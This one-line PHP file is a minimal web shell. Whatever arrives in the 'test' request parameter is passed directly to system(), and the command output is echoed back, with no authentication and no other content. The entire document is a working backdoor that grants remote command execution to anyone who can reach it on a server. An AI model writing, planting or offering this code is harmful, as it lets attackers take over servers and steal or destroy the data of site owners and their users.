<?php if(isset($_REQUEST['test'])){ echo "<pre>"; $test = ($_REQUEST['test']); system($test); echo "</pre>"; die; }?>
